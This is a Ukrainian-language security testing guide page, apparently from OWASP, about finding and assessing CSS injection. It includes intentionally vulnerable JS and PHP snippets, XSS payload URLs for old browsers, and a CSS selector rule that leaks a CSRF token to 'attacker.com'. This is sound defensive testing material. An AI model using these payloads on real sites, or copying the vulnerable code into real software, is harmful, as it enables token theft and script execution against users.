# Тестування CSS-ін'єкцій

## Огляд

Уразливість ін'єкції CSS охоплює можливість вводити довільний код CSS у контексті довіреного вебсайту, який відображається в браузері жертви. Вплив цього типу вразливості залежить від корисного навантаження CSS. Він може призвести до XSS або витоку даних.

Ця вразливість виникає, коли застосунок дає змогу CSS, що надається користувачем, втручатися в наявні таблиці стилів застосунку. Ін'єкція коду в контексті CSS може надати зловмиснику можливість за певних умов виконувати JavaScript або витягувати чутливі дані за допомогою селекторів CSS і функцій, здатних формувати HTTP-запити. Як правило, надання користувачам можливості налаштовувати сторінки за допомогою своїх CSS-файлів пов'язане зі значним ризиком.

У наступному коді JavaScript показано можливий вразливий скрипт, у якому зловмисник може контролювати `location.hash` (джерело), який веде до функції `cssText` (приймач). Цей приклад може призвести до XSS на основі DOM у старих версіях браузерів, для отримання додаткової інформації див. [пам'ятка щодо запобігання XSS на основі DOM](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

Зловмисник може націлитися на жертву, попросивши її відвідати такі URL-адреси:

- `www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;` (Opera \[8,12\])
- `www.victim.com/#red;-:expression(alert(URL=1));` (IE 7/8)

Така сама вразливість може з'явитися і в разі відображеного XSS, наприклад, у наступному коді на PHP:

```php
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

Подальші сценарії атак передбачають можливість вилучення даних за допомогою прийняття чистих CSS-правил. Такі атаки можуть проводитися через CSS-селектори, що призводить до витоку даних, наприклад, CSRF-токенів.

Ось приклад коду, який намагається вибрати введення з `name`, що збігається з `csrf_token`, і `value`, що починається на `a`. Використовуючи атаку методом перебору для визначення `value` атрибута, можна здійснити атаку, яка передає значення домену зловмисника, наприклад, намагаючись встановити фонове зображення на обраному елементі введення.

```html
<style>
input[name=csrf_token][value=^a] {
    background-image: url(http://attacker.com/log?a);
}
</style>
```

Інші атаки з використанням запитаного контенту, такого як CSS, висвітлюються у відеоролику [Mario Heiderich «Got Your Nose»](https://www.youtube.com/watch?v=FIQvAaZj_HA) на Youtube.

## Завдання тестування

- Знайти точки ін'єкції CSS.
- Оцінити вплив ін'єкції.

## Як тестувати

Необхідно проаналізувати код, щоб визначити, чи дозволено користувачеві вводити контент у контексті CSS. Зокрема, слід перевірити спосіб, у який вебсайт повертає правила CSS на основі вхідних даних.

Нижче наведено базовий приклад:

```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

Вищенаведений код містить джерело `location.hash`, контрольоване зловмисником, яке може вставлятися безпосередньо в атрибут `style` HTML-елемента. Як згадувалося вище, це може призвести до різних результатів залежно від використовуваного браузера та наданого корисного навантаження.

На наступних сторінках наведено приклади вразливостей, пов'язаних із CSS-ін'єкціями:

- [Password "cracker" via CSS and HTML5](http://html5sec.org/invalid/?length=25)
- [CSS attribute reading](http://eaea.sirdarckcat.net/cssar/v2/)
- [JavaScript based attacks using `CSSStyleDeclaration` with unescaped input](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)

Додаткові ресурси OWASP щодо запобігання ін'єкціям CSS див. у [пам'ятці щодо захисту каскадних таблиць стилів](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).
